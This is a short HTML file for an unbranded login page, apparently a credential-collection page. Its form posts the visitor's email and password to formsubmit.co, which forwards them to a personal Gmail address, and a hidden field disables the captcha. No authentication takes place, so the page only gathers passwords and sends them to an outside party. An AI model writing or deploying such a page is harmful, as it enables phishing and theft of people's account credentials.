
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Login Form</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
      body {
        font-family: "Inter", sans-serif;
      }
    </style>
  </head>
  <body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <form action="https://formsubmit.co/mbavemc@gmail.com" method="POST" class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md space-y-6">
      <h2 class="text-2xl font-bold text-center text-gray-800">Login</h2>

      <input type="hidden" name="_captcha" value="false">

      <div>
        <label for="email" class="block mb-2 text-sm font-semibold text-gray-700">Email</label>
        <input type="email" name="email" id="email" required placeholder="your@email.com"
          class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400"/>
      </div>

      <div>
        <label for="password" class="block mb-2 text-sm font-semibold text-gray-700">Password</label>
        <input type="password" name="password" id="password" required placeholder="••••••••"
          class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400"/>
      </div>

      <button type="submit"
        class="w-full bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600 transition">
        Submit
      </button>
    </form>
  </body>
</html>
